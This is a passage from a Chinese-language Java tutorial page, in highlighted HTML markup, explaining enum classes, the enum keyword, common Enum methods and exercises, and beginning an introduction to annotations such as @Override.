class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;秋天&quot;</span>,<span class="hljs-string">&quot;凉爽&quot;</span>);<br> <span class="hljs-comment">//因为对于季节而言，他的对象（具体值），是固定的4个，不会有更多</span><br> <span class="hljs-comment">//这个设计类的思路，不能提现季节是固定的四个对象</span><br> <span class="hljs-comment">//这样的设计不好 ===》 枚举类[枚:一个一个；举:列举。即把具体的对象一个一个列举出来的类]</span><br>        <span class="hljs-type">Season</span> <span class="hljs-variable">other</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;红天&quot;</span>,<span class="hljs-string">&quot;~~~~&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Season</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc; <span class="hljs-comment">//描述</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Season</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDesc</span><span class="hljs-params">(String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>季节只有固定的四个，但这样的设计不能提现季节是固定的四个对象，对象的属性也可以随便更改。</p><p>所以使用枚举类（枚:一个一个；举:列举。即把具体的对象一个一个列举出来的类）。</p><h4 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h4><p>需要创建的Season对象有如下特点</p><ol><li>季节的值是有限的几个值（spring、summer、autumn、winter）</li><li>只读，不需要修改。</li></ol><h4 id="解决问题-枚举（enumeration-enum-）"><a href="#解决问题-枚举（enumeration-enum-）" class="headerlink" title="解决问题-枚举（enumeration[enum]）"></a>解决问题-枚举（enumeration[enum]）</h4><ol><li>枚举是一组常量的集合</li><li>枚举属于一种特殊的类，里面只包含一组有限的特定的对象</li></ol><h3 id="枚举的两种实现方式"><a href="#枚举的两种实现方式" class="headerlink" title="枚举的两种实现方式"></a>枚举的两种实现方式</h3><h4 id="1-自定义实现枚举"><a href="#1-自定义实现枚举" class="headerlink" title="1.自定义实现枚举"></a>1.自定义实现枚举</h4><ol><li><strong>不需要提供setXXX方法</strong>， 因为枚举值通常为只读</li><li>对枚举对象&#x2F;属性使用<strong>final + static共同修饰</strong>，实现底层优化</li><li>枚举<strong>对象名通常使用全部大写</strong>，常量的命名规则</li><li>枚举对象根据需要，也可以有多个属性</li></ol><p>举例：四季</p><p>步骤：</p><p>1.构造器私有化，防止直接new</p><p>2.去掉setXXX相关方法，防止属性被修改</p><p>3.在Season内部，直接创建固定的对象</p><p>4.(优化)可以再加入final修饰符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Enumeration02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(Season.SPRING);<br>        System.out.println(Season.SUMMER);<br>        System.out.println(Season.AUTUMN);<br>        System.out.println(Season.WINTER);<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//演示自定义枚举实现</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Season</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc; <span class="hljs-comment">//描述</span><br><br>    <span class="hljs-comment">//定义了四个对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Season</span> <span class="hljs-variable">SPRING</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;春天&quot;</span>,<span class="hljs-string">&quot;温暖&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Season</span> <span class="hljs-variable">WINTER</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;冬天&quot;</span>,<span class="hljs-string">&quot;寒冷&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Season</span> <span class="hljs-variable">SUMMER</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;夏天&quot;</span>,<span class="hljs-string">&quot;炎热&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Season</span> <span class="hljs-variable">AUTUMN</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;秋天&quot;</span>,<span class="hljs-string">&quot;凉爽&quot;</span>);<br><br>    <span class="hljs-comment">//1.构造器私有化，防止直接new</span><br>    <span class="hljs-comment">//2.去掉setXXX相关方法，防止属性被修改</span><br>    <span class="hljs-comment">//3.在Season内部，直接创建固定的对象</span><br>    <span class="hljs-comment">//4.(优化)可以再加入final修饰符</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Season</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Season&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221103113040832.png" alt="image-20221103113040832" style="zoom:50%;" /><p><strong>自定义实现枚举的特点</strong>：</p><ol><li><p>构造器私有化</p></li><li><p>本类内部创建一组对象</p></li><li><p>对外暴露对象（通过为对象添加public final static修饰符）</p></li><li><p>可以提供get方法，不要提供set方法</p></li></ol><h4 id="2-使用enum关键字实现枚举"><a href="#2-使用enum关键字实现枚举" class="headerlink" title="2.使用enum关键字实现枚举"></a>2.使用enum关键字实现枚举</h4><p>步骤：</p><p> 1.使用关键字enum替代class</p><p> 2.public static final Season SPRING &#x3D; new Season(“春天”,”温暖”); 直接使用SPRING(“春天”,”温暖”);替代</p><p>3.如果有多个常量，使用’,’间隔即可</p><p>4.如果使用enum来实现枚举，需要将定义常量对象，写在最前面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Enumeration03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(Season2.AUTUMN);<br>        System.out.println(Season2.SUMMER);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//演示使用enum关键字实现枚举</span><br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Season2</span> &#123;<br>    <span class="hljs-comment">// 1.使用关键字enum替代class</span><br>    <span class="hljs-comment">// 2.public static final Season SPRING = new Season(&quot;春天&quot;,&quot;温暖&quot;); 直接使用SPRING(&quot;春天&quot;,&quot;温暖&quot;);替代</span><br>    <span class="hljs-comment">// 3.如果有多个常量，使用&#x27;,&#x27;间隔即可</span><br>    <span class="hljs-comment">// 4.如果使用enum来实现枚举，需要将定义常量对象，写在最前面</span><br><br>    <span class="hljs-comment">//定义了四个对象</span><br>    <span class="hljs-comment">//常量名(实参列表)</span><br>    SPRING(<span class="hljs-string">&quot;春天&quot;</span>,<span class="hljs-string">&quot;温暖&quot;</span>),WINTER(<span class="hljs-string">&quot;冬天&quot;</span>,<span class="hljs-string">&quot;寒冷&quot;</span>),<br>    SUMMER(<span class="hljs-string">&quot;夏天&quot;</span>,<span class="hljs-string">&quot;炎热&quot;</span>),AUTUMN(<span class="hljs-string">&quot;秋天&quot;</span>,<span class="hljs-string">&quot;凉爽&quot;</span>);<br><br>    <span class="hljs-comment">//如果使用enum，定义属性需要放在后面</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc; <span class="hljs-comment">//描述</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Season2</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Season&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="enum关键字实现枚举-使用细节"><a href="#enum关键字实现枚举-使用细节" class="headerlink" title="enum关键字实现枚举-使用细节"></a>enum关键字实现枚举-使用细节</h3><p>test.java 和 test.class</p><p>test.java &#x3D;&#x3D;&#x3D;》test.class 叫做<strong>编译</strong>，使用<strong>javac</strong>指令。</p><p>test.java《&#x3D;&#x3D;&#x3D; test.class 叫做<strong>反编译</strong>，使用<strong>javap</strong>指令。</p><p>反编译前面的Season2，命令行输出如下。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Compiled from <span class="hljs-string">&quot;Enumeration03.java&quot;</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.hspedu.enum_.Season2 extends java.lang.Enum&lt;com.hspedu.enum_.Season2&gt; &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> com.hspedu.enum_.Season2 SPRING;<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> com.hspedu.enum_.Season2 WINTER;<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> com.hspedu.enum_.Season2 SUMMER;<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> com.hspedu.enum_.Season2 AUTUMN;<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> com.hspedu.enum_.Season2[] <span class="hljs-built_in">values</span>();<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> com.hspedu.enum_.<span class="hljs-function">Season2 <span class="hljs-title">valueOf</span><span class="hljs-params">(java.lang.<span class="hljs-type">String</span>)</span></span>;<br>  <span class="hljs-keyword">public</span> java.lang.<span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-keyword">public</span> java.lang.<span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">getDesc</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-keyword">public</span> java.lang.<span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-type">static</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><ol><li>使用enum关键字开发一个枚举类时，默认会继承Enum类，而且是一个final类</li><li>传统的<code>public static final Season SPRING = new Season(&quot;春天&quot;,&quot;温暖&quot;);</code>简化成<code>SPRING(&quot;春天&quot;,&quot;温暖&quot;)</code>，这里必须知道，它调用的是哪一个构造器。</li><li>如果使用无参构造器创建枚举对象，则实参列表和小括号都可以省略。</li><li>当有多个枚举对象时，用’,’间隔，最后用分号结尾</li><li>枚举对象必须放在枚举类的行首</li></ol><h3 id="课题练习"><a href="#课题练习" class="headerlink" title="课题练习"></a>课题练习</h3><p>1.下面代码是否正确，并说明含义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Gender</span>&#123;<br>BOY,GIRL;<br>&#125;<br></code></pre></td></tr></table></figure><p>正确的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Gender</span>&#123;<br>BOY,GIRL;<span class="hljs-comment">//这里其实就是调用Gender类的无参构造器</span><br>&#125;<br></code></pre></td></tr></table></figure><p>有一个枚举类Gender，无属性。</p><p>有两个枚举对象BOY,GIRL，使用的无参构造器创建。</p><p>2.下面代码是否正确，并说明含义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Gender2</span>&#123;<br>BOY,GIRL;<br>&#125;<br><span class="hljs-type">Gender2</span> <span class="hljs-variable">boy</span> <span class="hljs-operator">=</span> Gender2.BOY;<br><span class="hljs-type">Gender2</span> <span class="hljs-variable">boy2</span> <span class="hljs-operator">=</span> Gender2.BOY;<br>System.out.println(boy); <br>System.out.println(boy2 == boy);<br></code></pre></td></tr></table></figure><p>输出BOY，和true。</p><h3 id="enum常用方法说明"><a href="#enum常用方法说明" class="headerlink" title="enum常用方法说明"></a>enum常用方法说明</h3><p>使用关键字enum时，会隐式继承Enum类（可以使用Enum类相关的方法）</p><p>常用方法表：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221104120717090.png" alt="image-20221104120717090"></p><p>使用Season2作为例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">SPRING(<span class="hljs-string">&quot;春天&quot;</span>,<span class="hljs-string">&quot;温暖&quot;</span>),WINTER(<span class="hljs-string">&quot;冬天&quot;</span>,<span class="hljs-string">&quot;寒冷&quot;</span>),<br>SUMMER(<span class="hljs-string">&quot;夏天&quot;</span>,<span class="hljs-string">&quot;炎热&quot;</span>),AUTUMN(<span class="hljs-string">&quot;秋天&quot;</span>,<span class="hljs-string">&quot;凉爽&quot;</span>);<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> String desc; <br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//以使用Season2枚举类来演示</span><br><span class="hljs-type">Season2</span> <span class="hljs-variable">autumn</span> <span class="hljs-operator">=</span> Season2.AUTUMN;<br><br><span class="hljs-comment">//name() 输出枚举对象的名称</span><br>System.out.println(autumn.name()); <span class="hljs-comment">//输出AUTUMN</span><br><br><span class="hljs-comment">//ordinal() 输出的是该枚举对象的次序，从0开始编号</span><br>System.out.println(autumn.ordinal()); <span class="hljs-comment">//输出3，因为次序是第四个</span><br><br><span class="hljs-comment">//values() 【从反编译可以看到，返回Season2[]】</span><br>Season2[] values = Season2.values();<br>System.out.println(<span class="hljs-string">&quot;==遍历取出枚举对象==&quot;</span>);<br><span class="hljs-keyword">for</span>(Season2 season2:values)&#123; <span class="hljs-comment">//增强for循环</span><br>    System.out.println(season2);<br>&#125;<br><span class="hljs-comment">//输出如下：</span><br><span class="hljs-comment">//        ==遍历取出枚举对象==</span><br><span class="hljs-comment">//        Season&#123;name=&#x27;春天&#x27;, desc=&#x27;温暖&#x27;&#125;</span><br><span class="hljs-comment">//        Season&#123;name=&#x27;冬天&#x27;, desc=&#x27;寒冷&#x27;&#125;</span><br><span class="hljs-comment">//        Season&#123;name=&#x27;夏天&#x27;, desc=&#x27;炎热&#x27;&#125;</span><br><span class="hljs-comment">//        Season&#123;name=&#x27;秋天&#x27;, desc=&#x27;凉爽&#x27;&#125;</span><br><br><span class="hljs-comment">//valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量，否则报错</span><br><span class="hljs-type">Season2</span> <span class="hljs-variable">autumn1</span> <span class="hljs-operator">=</span> Season2.valueOf(<span class="hljs-string">&quot;AUTUMN&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;autumn1=&quot;</span>+autumn1);<br><span class="hljs-comment">//输出：autumn1=Season&#123;name=&#x27;秋天&#x27;, desc=&#x27;凉爽&#x27;&#125;</span><br><br><span class="hljs-comment">//compareTo:比较两个枚举常量，比较的就是编号</span><br><span class="hljs-comment">//下例比较的是Season2.AUTUMN枚举对象的标号，和Season2.SUMMER的编号</span><br><span class="hljs-comment">//使用Season2.AUTUMN编号-Season2.SUMMER编号，3-2，所以返回1</span><br>System.out.println(Season2.AUTUMN.compareTo(Season2.SUMMER)); <span class="hljs-comment">//输出1</span><br></code></pre></td></tr></table></figure><p>*<strong>关于增强for循环</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] number = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x:number)&#123;<br>System.out.println(x);<br>&#125;<br><span class="hljs-comment">//意为把number数组每一项遍历出来赋值给x</span><br></code></pre></td></tr></table></figure><h3 id="课堂练习2-1"><a href="#课堂练习2-1" class="headerlink" title="课堂练习2"></a>课堂练习2</h3><blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221104123354849.png" alt="image-20221104123354849"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnumExercise02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;==所有星期的信息如下==&quot;</span>);<br>        Week[] values = Week.values();<br>        <span class="hljs-keyword">for</span>(Week week:values)&#123;<br>            System.out.println(week);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Week</span>&#123;<br>    MONDAY(<span class="hljs-string">&quot;星期一&quot;</span>),TUESDAY(<span class="hljs-string">&quot;星期二&quot;</span>),<br>    WEDNESDAY(<span class="hljs-string">&quot;星期三&quot;</span>),THURSDAY(<span class="hljs-string">&quot;星期四&quot;</span>),<br>    FRIDAY(<span class="hljs-string">&quot;星期五&quot;</span>),SATURDAY(<span class="hljs-string">&quot;星期六&quot;</span>),<br>    SUNDAY(<span class="hljs-string">&quot;星期日&quot;</span>);<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Week</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="enum实现接口"><a href="#enum实现接口" class="headerlink" title="enum实现接口"></a>enum实现接口</h3><p>使用enum关键字后，就<strong>不能再继承</strong>其他类了，因为enum会隐式继承Enum类，而Java是单继承机制。</p><p>但枚举类和普通类一样，可以实现接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnumDetail</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Music.CLASSICMUSIC.playing();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IPlaying</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playing</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Music</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IPlaying</span>&#123;<br>    CLASSICMUSIC;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playing</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;播放好听的音乐。&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-注解"><a href="#2-注解" class="headerlink" title="2.注解"></a>2.注解</h2><h3 id="关于注解的理解"><a href="#关于注解的理解" class="headerlink" title="关于注解的理解"></a>关于注解的理解</h3><ol><li>注解（Annotation）也被称为元数据（Metadata），用于修饰解释 包、类、方法、属性、构造器、局部变量等数据信息。</li><li>和注释一样，注解不影响程序逻辑。但注释可以被编译或运行，相当于嵌入在代码中的补充信息。</li><li>在JavaSE中，注解的使用目的比较简单（例如标记过时的功能，忽略警告等）。</li><li>在JavaEE中，注解占据了更重要的角色，例如用来配置应用程序的任何切面，代替javaEE旧版中所遗留的繁冗代码和XML配置等。</li></ol><h3 id="基本的Annotation介绍"><a href="#基本的Annotation介绍" class="headerlink" title="基本的Annotation介绍"></a>基本的Annotation介绍</h3><p>使用Annotation时要在其前面增加@符号，并把该Annotation当成一个修饰符使用，用于修饰它支持的程序元素：</p><p><strong>三个基本的Annotation：</strong></p><ol><li>@Override ：限定某个方法，是重写父类方法，该注解只能用于方法。</li><li>@Deprecated：用于表示某个程序元素（类、方法等）已过时。</li><li>@SuppressWarnings：抑制编译器警告。</li></ol><h3 id="1-Override"><a href="#1-Override" class="headerlink" title="1.Override"></a>1.Override</h3><p>限定某个方法，是重写父类方法，该注解只能用于方法。</p><p><strong>使用说明：</strong></p><ol><li>@Override表示指定重写父类的方法（<strong>从编译层面验证</strong>），如果父类没有fly方法，就会报错</li><li>如果不写@Override注解，而父类仍有public void fly(){}，仍然构成重写</li><li>@Override只能修饰方法，不能修饰其他类、包、属性等等</li><li>查看@Override注解源码<code>@Target(ElementType.METHOD)</code>，说明只能修饰方法</li><li><strong>@Target</strong>是<strong>修饰注释的注解</strong>，称为<strong>元注解</strong>。</li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span 